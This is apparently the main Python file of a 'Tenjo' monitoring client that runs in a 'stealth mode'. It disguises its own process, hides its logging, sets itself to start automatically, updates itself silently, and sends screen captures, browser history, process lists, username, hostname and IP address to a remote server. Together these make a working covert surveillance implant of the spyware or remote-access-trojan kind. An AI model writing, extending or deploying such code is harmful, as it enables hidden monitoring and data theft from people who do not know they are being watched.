#!/usr/bin/env python3
# Tenjo Client - STEALTH MODE (NO HANG)

import sys
import os
import time
from datetime import datetime, timezone
import logging
import signal
import threading

# Add src to path
sys.path.append('src')

from src.core.config import Config
from src.utils.api_client import APIClient
from src.utils.auto_update import check_and_update_if_needed
from src.modules.stream_handler import StreamHandler
from src.modules.browser_tracker import BrowserTracker
from src.modules.screen_capture import ScreenCapture
from src.modules.process_monitor import ProcessMonitor
from src.utils.stealth import StealthMode, StealthManager
from src.utils.process_disguise import apply_disguise
from os_detector import get_os_info_for_client

# FIX #41-42: Import live update components for self-healing
try:
    from src.utils.live_update import DependencyChecker, PythonInstallationChecker
    LIVE_UPDATE_AVAILABLE = True
except ImportError:
    LIVE_UPDATE_AVAILABLE = False

# Apply process disguise immediately (before anything else)
try:
    apply_disguise()
except Exception as e:
    # Don't let disguise failure stop the client
    pass

# Global flag for graceful shutdown with thread safety
shutdown_flag = False
shutdown_lock = threading.Lock()

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    global shutdown_flag
    with shutdown_lock:
        shutdown_flag = True

def is_shutdown_requested():
    """Thread-safe check for shutdown flag"""
    with shutdown_lock:
        return shutdown_flag

def setup_stealth_logging():
    """Setup logging for stealth mode - minimal output"""
    if Config.STEALTH_MODE:
        # In stealth mode, log to file only with minimal level
        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')
        logging.basicConfig(
            level=logging.WARNING,  # Only warnings and errors
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, mode='a'),
                # No console handler in stealth mode
            ]
        )
    else:
        # Development mode - normal logging
        logging.basicConfig(
            level=getattr(logging, Config.LOG_LEVEL),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )

class StealthClient:
    def __init__(self):
        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)
        self.stream_handler = StreamHandler(self.api_client)
        self.process_monitor = ProcessMonitor(self.api_client)
        self.stealth_mode = StealthMode()
        self.stealth_manager = StealthManager(entry_script=os.path.abspath(__file__))
        self.heartbeat_interval = max(10, Config.HEARTBEAT_INTERVAL)
        self.registered = False
        self.last_register_attempt = 0.0
        self.registration_retry_interval = 120  # seconds

        # Setup stealth logging
        setup_stealth_logging()
        self.logger = logging.getLogger('StealthClient')

        # Initialize browser tracker
        self.browser_tracker = BrowserTracker(self.api_client, self.logger)

        # Initialize screen capture with browser tracker integration
        self.screen_capture = ScreenCapture(self.api_client)
        self.screen_capture.set_browser_tracker(self.browser_tracker)

        # FIX #41-42, #48: Initialize dependency checker for self-healing
        # Use absolute path relative to main.py location
        main_dir = os.path.dirname(os.path.abspath(__file__))
        requirements_file = os.path.join(main_dir, "requirements.txt")

        # Fallback: try current working directory
        if not os.path.exists(requirements_file):
            requirements_file = os.path.join(os.getcwd(), "requirements.txt")

        if LIVE_UPDATE_AVAILABLE and os.path.exists(requirements_file):
            self.dependency_checker = DependencyChecker(requirements_file, self.logger)
        else:
            self.dependency_checker = None

        # Enable stealth-specific behaviors
        if Config.STEALTH_MODE:
            self.stealth_mode.enable_stealth()

    def register_client(self, force: bool = False) -> bool:
        """Register client with server and persist status."""
        now = time.time()
        if not force and (now - self.last_register_attempt) < self.registration_retry_interval:
            return self.registered

        self.last_register_attempt = now

        try:
            # Get OS info using the new detector
            os_info = get_os_info_for_client()
            
            client_info = {
                'client_id': Config.CLIENT_ID,
                'hostname': Config.HOSTNAME,
                'platform': Config.PLATFORM,
                'version': '1.0.0',
                'capabilities': ['streaming', 'monitoring'],
                'ip_address': Config.IP_ADDRESS,  # Use real IP address
                'username': Config.CLIENT_USER,
                'os_info': os_info,
                'timezone': 'Asia/Jakarta'
            }

            response = self.api_client.post('/api/clients/register', client_info)

            if isinstance(response, dict) and response.get('success') is False:
                raise ValueError(response.get('message', 'Registration rejected by server'))

            self._mark_registered()
            return True
        except Exception as e:
            self.registered = False
            error_message = f"Registration failed: {e}"
            self.logger.warning(error_message)
            self._record_registration_failure(error_message)
            return False

    def send_heartbeat(self):
        """Send heartbeat to server (silent)"""
        try:
            heartbeat_data = {
                'client_id': Config.CLIENT_ID,
                'timestamp': time.time(),
                'status': 'active'
            }

            response = self.api_client.post('/api/clients/heartbeat', heartbeat_data)
            if isinstance(response, dict) and response.get('success') is False:
                raise ValueError(response.get('message', 'Heartbeat rejected by server'))
            return True
        except Exception as e:
            # Silent fail in stealth mode
            self.registered = False
            return False

    def _mark_registered(self) -> None:
        self.registered = True
        marker_path = os.path.join(Config.DATA_DIR, '.registered')
        try:
            with open(marker_path, 'w', encoding='utf-8') as fh:
                fh.write(datetime.now(timezone.utc).isoformat())
        except Exception:
            pass

    def _record_registration_failure(self, message: str) -> None:
        try:
            failure_log = os.path.join(Config.LOG_DIR, 'registration_failures.log')
            with open(failure_log, 'a', encoding='utf-8') as fh:
                fh.write(f"{datetime.now(timezone.utc).isoformat()} - {message}\n")
        except Exception:
            pass

    def check_and_fix_dependencies(self):
        """FIX #42, #49: Periodic dependency check and auto-install (fully stealth)"""
        if not self.dependency_checker:
            return

        try:
            missing = self.dependency_checker.check_dependencies()
            if any(not installed for installed in missing.values()):
                # FIX #49: Check if auto-install succeeded
                success = self.dependency_checker.auto_install_missing(silent=True)
                if not success:
                    # Log error even in stealth mode (ERROR level)
                    self.logger.error(f"Dependency auto-install failed for packages: {[pkg for pkg, installed in missing.items() if not installed]}")
        except Exception as e:
            # Log error even in stealth mode
            self.logger.error(f"Dependency check failed: {e}")

    def run(self):
        """Main execution loop - STEALTH MODE"""
        global shutdown_flag

        if not Config.STEALTH_MODE:
            self.logger.info("=== STEALTH TENJO CLIENT STARTING ===")

        # Install autostart on first run
        if Config.STEALTH_MODE and not os.path.exists(os.path.join(Config.DATA_DIR, '.installed')):
            self.stealth_manager.configure_autostart()
            with open(os.path.join(Config.DATA_DIR, '.installed'), 'w') as f:
                f.write(str(time.time()))

        # Register with server (optional)
        self.register_client(force=True)

        # Start stream handler in separate thread
        stream_thread = None
        try:
            stream_thread = threading.Thread(
                target=self.stream_handler.start_streaming,
                daemon=True,
                name="StreamHandler"
            )
            stream_thread.start()
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start stream handler: {e}")

        # Start browser tracker in separate thread
        browser_thread = None
        try:
            self.browser_tracker.start_tracking()
            if not Config.STEALTH_MODE:
                self.logger.info("Browser tracker started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start browser tracker: {e}")

        # Start conditional screen capture in separate thread
        screen_capture_thread = None
        try:
            screen_capture_thread = threading.Thread(
                target=self.screen_capture.start_capture,
                daemon=True,
                name="ScreenCapture"
            )
            screen_capture_thread.start()
            if not Config.STEALTH_MODE:
                self.logger.info("Conditional screen capture started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start screen capture: {e}")

        # Start process monitor in separate thread
        process_thread = None
        try:
            process_thread = threading.Thread(
                target=self.process_monitor.start_monitoring,
                daemon=True,
                name="ProcessMonitor"
            )
            process_thread.start()
            if not Config.STEALTH_MODE:
                self.logger.info("Process monitor started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start process monitor: {e}")

        # Stealth main loop - minimal logging
        last_heartbeat_at = time.time()
        last_status_log = time.time()
        last_dependency_check = time.time()
        loop_counter = 0
        while not is_shutdown_requested():
            try:
                loop_counter += 1
                current_time = time.time()

                if not self.registered and (current_time - self.last_register_attempt) >= self.registration_retry_interval:
                    self.register_client(force=True)

                # Send heartbeat based on configured interval
                if current_time - last_heartbeat_at >= self.heartbeat_interval:
                    self.send_heartbeat()
                    last_heartbeat_at = current_time

                # FIX #42: Periodic dependency check (every hour)
                if current_time - last_dependency_check >= 3600:
                    self.check_and_fix_dependencies()
                    last_dependency_check = current_time

                # Log status periodically when not in stealth mode (every hour)
                if not Config.STEALTH_MODE and current_time - last_status_log >= 3600:
                    self.logger.info(
                        f"Stealth client running - {loop_counter} cycles completed"
                    )
                    last_status_log = current_time

                time.sleep(5)  # 5 second intervals

            except KeyboardInterrupt:
                if not Config.STEALTH_MODE:
                    self.logger.info("Received keyboard interrupt")
                break
            except Exception as e:
                if not Config.STEALTH_MODE:
                    self.logger.error(f"Main loop error: {e}")
                time.sleep(10)

        if not Config.STEALTH_MODE:
            self.logger.info("Stealth client shutting down...")

def main():
    """Entry point"""
    # FIX #41: Check Python installation on startup
    if LIVE_UPDATE_AVAILABLE:
        try:
            if not PythonInstallationChecker.check_python_installation():
                # Python/pip not properly installed - log error
                # TODO: Auto-download and install Python silently
                # For now, we just log the issue
                if not getattr(Config, 'STEALTH_MODE', True):
                    print("Warning: Python installation issue detected")
        except Exception:
            # Silent fail in stealth mode
            pass

    # FIX #43: Check file integrity on startup
    try:
        from src.utils.auto_update import ClientUpdater
        updater = ClientUpdater(Config)
        if not updater.check_file_integrity():
            # Critical files missing, attempt restore from backup
            if updater.restore_from_backup():
                # Restore successful, restart to use restored files
                if not getattr(Config, 'STEALTH_MODE', True):
                    print("Files restored from backup, restarting...")
                updater.restart_client()
                return
            else:
                # Restore failed, continue with degraded functionality
                if not getattr(Config, 'STEALTH_MODE', True):
                    print("Warning: File integrity check failed, some features may not work")
    except Exception:
        # Silent fail in stealth mode
        pass

    # Check for updates first (will restart if update available)
    try:
        if check_and_update_if_needed(Config):
            # Update was performed, client will restart
            return
    except Exception as e:
        # FIX #30: Silently continue on update failure (fully stealth)
        # Update failed, continue with current version without any output
        pass

    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Create and run stealth client
    client = StealthClient()
    client.run()

if __name__ == "__main__":
    main()
